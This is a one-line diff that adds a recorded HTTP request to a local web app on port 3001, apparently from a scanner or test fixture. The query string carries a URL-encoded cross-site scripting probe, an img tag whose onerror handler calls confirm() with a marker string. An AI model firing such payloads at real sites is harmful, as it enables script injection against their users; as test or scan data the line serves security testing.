@@ -1,0 +1,1 @@
+GET http://127.0.0.1:3001/#/?q=%3Cimg+src%3Dx+onerror%3Dconfirm%28%27stofxssdc0889c2%27%29%3E
